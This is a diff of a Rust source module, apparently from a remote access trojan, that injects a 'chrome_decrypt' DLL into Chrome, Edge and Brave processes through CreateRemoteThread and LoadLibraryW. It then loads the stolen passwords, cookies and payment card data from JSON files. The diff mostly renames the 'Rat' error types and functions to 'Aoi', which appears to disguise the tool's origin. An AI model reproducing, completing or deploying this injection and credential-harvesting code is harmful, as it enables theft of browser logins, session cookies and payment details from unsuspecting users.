@@ -1,7 +1,7 @@
-// Browser DLL Injection Module
+﻿// Browser DLL Injection Module
 // Automatically injects Chrome decrypt DLL into Chrome/Edge/Brave processes
 
-use crate::RatError;
+use crate::AoiError;
 use serde::{Deserialize, Serialize};
 use std::{
     ffi::{c_void, OsStr},
@@ -66,10 +66,10 @@ pub struct BrowserInjector {
 }
 
 impl BrowserInjector {
-    pub fn new() -> Result<Self, RatError> {
-        let dll_path = Self::find_rat64_dll()?;
+    pub fn new() -> Result<Self, AoiError> {
+        let dll_path = Self::find_aoi64_dll()?;
         let output_dir = std::env::current_exe()
-            .map_err(|e| RatError::Io(e))?
+            .map_err(|e| AoiError::Io(e))?
             .parent()
             .unwrap()
             .to_path_buf();
@@ -81,7 +81,7 @@ impl BrowserInjector {
     }
 
     /// Chrome/Edge/Brave全てに対してDLL注入を実行し、データを収集
-    pub async fn inject_all_browsers(&self) -> Result<BrowserData, RatError> {
+    pub async fn inject_all_browsers(&self) -> Result<BrowserData, AoiError> {
         let browsers = ["chrome", "edge", "brave"];
 
         // 出力ディレクトリを環境変数に設定
@@ -102,7 +102,7 @@ impl BrowserInjector {
     }
 
     /// 指定されたブラウザ実行ファイルにDLLを注入
-    async fn inject_browser(&self, exe_path: &PathBuf) -> Result<(), RatError> {
+    async fn inject_browser(&self, exe_path: &PathBuf) -> Result<(), AoiError> {
         // Create suspended process
         let mut si = STARTUPINFOW::default();
         si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
@@ -123,7 +123,7 @@ impl BrowserInjector {
                 &mut pi,
             );
             if let Err(e) = result {
-                return Err(RatError::Command(format!("CreateProcessW failed: {:?}", e)));
+                return Err(AoiError::Command(format!("CreateProcessW failed: {:?}", e)));
             }
         }
 
@@ -139,7 +139,7 @@ impl BrowserInjector {
             )
         };
         if remote_mem.is_null() {
-            return Err(RatError::Command("VirtualAllocEx failed".to_string()));
+            return Err(AoiError::Command("VirtualAllocEx failed".to_string()));
         }
 
         unsafe {
@@ -152,13 +152,13 @@ impl BrowserInjector {
                 Some(&mut written),
             );
             if let Err(e) = result {
-                return Err(RatError::Command(format!(
+                return Err(AoiError::Command(format!(
                     "WriteProcessMemory failed: {:?}",
                     e
                 )));
             }
             if written != (dll_w.len() * 2) {
-                return Err(RatError::Command(
+                return Err(AoiError::Command(
                     "WriteProcessMemory size mismatch".to_string(),
                 ));
             }
@@ -169,7 +169,7 @@ impl BrowserInjector {
             match GetModuleHandleW(PCWSTR(self.wide("kernel32.dll").as_ptr())) {
                 Ok(handle) => handle,
                 Err(e) => {
-                    return Err(RatError::Command(format!(
+                    return Err(AoiError::Command(format!(
                         "GetModuleHandleW failed: {:?}",
                         e
                     )))
@@ -178,7 +178,7 @@ impl BrowserInjector {
         };
         let proc = unsafe { GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr())) };
         if proc.is_none() {
-            return Err(RatError::Command(
+            return Err(AoiError::Command(
                 "GetProcAddress(LoadLibraryW) failed".to_string(),
             ));
         }
@@ -190,7 +190,7 @@ impl BrowserInjector {
             match CreateRemoteThread(pi.hProcess, None, 0, start, Some(remote_mem), 0, None) {
                 Ok(handle) => handle,
                 Err(e) => {
-                    return Err(RatError::Command(format!(
+                    return Err(AoiError::Command(format!(
                         "CreateRemoteThread failed: {:?}",
                         e
                     )))
@@ -200,7 +200,7 @@ impl BrowserInjector {
 
         unsafe {
             if let Err(e) = CloseHandle(h_thread) {
-                return Err(RatError::Command(format!(
+                return Err(AoiError::Command(format!(
                     "CloseHandle(h_thread) failed: {:?}",
                     e
                 )));
@@ -264,7 +264,7 @@ impl BrowserInjector {
     }
 
     /// Chrome Decrypt DLLファイルを検索
-    fn find_rat64_dll() -> Result<PathBuf, RatError> {
+    fn find_aoi64_dll() -> Result<PathBuf, AoiError> {
         let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap_or_else(|_| ".".to_string());
 
         // Try different possible locations for chrome_decrypt.dll
@@ -285,7 +285,7 @@ impl BrowserInjector {
             }
         }
 
-        Err(RatError::Io(std::io::Error::new(
+        Err(AoiError::Io(std::io::Error::new(
             std::io::ErrorKind::NotFound,
             "chrome_decrypt.dll not found. Try building with: cargo build -p chrome_decrypt --profile release-tiny"
         )))
@@ -293,7 +293,7 @@ impl BrowserInjector {
 
     // ファイルベース収集を削除：IPCで直接データを受信
     #[allow(dead_code)]
-    async fn collect_injected_data(&self) -> Result<BrowserData, RatError> {
+    async fn collect_injected_data(&self) -> Result<BrowserData, AoiError> {
         let mut data = BrowserData::default();
 
         // Chromeディレクトリ内の出力ファイルをすべて検索
@@ -362,26 +362,26 @@ impl BrowserInjector {
     }
 
     /// パスワードJSONファイルを読み込み
-    fn load_passwords(&self, path: &PathBuf) -> Result<Vec<DllPasswordOut>, RatError> {
-        let content = std::fs::read_to_string(path).map_err(|e| RatError::Io(e))?;
+    fn load_passwords(&self, path: &PathBuf) -> Result<Vec<DllPasswordOut>, AoiError> {
+        let content = std::fs::read_to_string(path).map_err(|e| AoiError::Io(e))?;
         let passwords: Vec<DllPasswordOut> = serde_json::from_str(&content)
-            .map_err(|e| RatError::Command(format!("パスワードJSON解析エラー: {}", e)))?;
+            .map_err(|e| AoiError::Command(format!("パスワードJSON解析エラー: {}", e)))?;
         Ok(passwords)
     }
 
     /// クッキーJSONファイルを読み込み
-    fn load_cookies(&self, path: &PathBuf) -> Result<Vec<DllCookieOut>, RatError> {
-        let content = std::fs::read_to_string(path).map_err(|e| RatError::Io(e))?;
+    fn load_cookies(&self, path: &PathBuf) -> Result<Vec<DllCookieOut>, AoiError> {
+        let content = std::fs::read_to_string(path).map_err(|e| AoiError::Io(e))?;
         let cookies: Vec<DllCookieOut> = serde_json::from_str(&content)
-            .map_err(|e| RatError::Command(format!("クッキーJSON解析エラー: {}", e)))?;
+            .map_err(|e| AoiError::Command(format!("クッキーJSON解析エラー: {}", e)))?;
         Ok(cookies)
     }
 
     /// 支払いJSONファイルを読み込み
-    fn load_payments(&self, path: &PathBuf) -> Result<Vec<DllPaymentOut>, RatError> {
-        let content = std::fs::read_to_string(path).map_err(|e| RatError::Io(e))?;
+    fn load_payments(&self, path: &PathBuf) -> Result<Vec<DllPaymentOut>, AoiError> {
+        let content = std::fs::read_to_string(path).map_err(|e| AoiError::Io(e))?;
         let payments: Vec<DllPaymentOut> = serde_json::from_str(&content)
-            .map_err(|e| RatError::Command(format!("支払いJSON解析エラー: {}", e)))?;
+            .map_err(|e| AoiError::Command(format!("支払いJSON解析エラー: {}", e)))?;
         Ok(payments)
     }
 
